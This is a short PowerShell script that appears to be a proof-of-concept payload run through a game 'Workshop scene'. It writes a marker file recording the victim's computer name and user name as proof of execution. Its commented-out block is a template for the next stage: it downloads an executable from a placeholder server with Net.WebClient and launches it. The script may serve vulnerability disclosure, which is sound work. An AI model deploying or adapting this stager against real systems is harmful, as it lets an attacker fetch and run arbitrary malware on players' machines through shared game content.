$marker = "C:\Users\Public\hotlava-dl-proof.txt"
"[$(Get-Date -Format o)] downloader executed via Workshop scene on $env:COMPUTERNAME as $env:USERNAME" | Out-File $marker -Append

# swap the below for any further staged binary
# $url = "http://<SERVER>/next_stage.exe"
# $dest = "$env:TEMP\next_stage.exe"
# (New-Object Net.WebClient).DownloadFile($url, $dest)
# Start-Process $dest
